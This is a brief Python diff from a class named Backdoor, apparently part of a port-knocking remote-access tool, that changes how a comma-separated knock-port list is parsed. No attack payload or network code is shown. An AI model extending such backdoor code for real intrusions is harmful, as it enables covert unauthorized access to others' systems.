@@ -16,7 +16,10 @@ class Backdoor(object):
         self.remotePort = int(rport)
         self.protocol = proto.upper()
 
-        self.knockList = kList
+        self.knockList = []
+        for port in kList.split(','):
+            self.knockList.append(port)
+            
         self.password = password
         self.chunk_size = 16
 
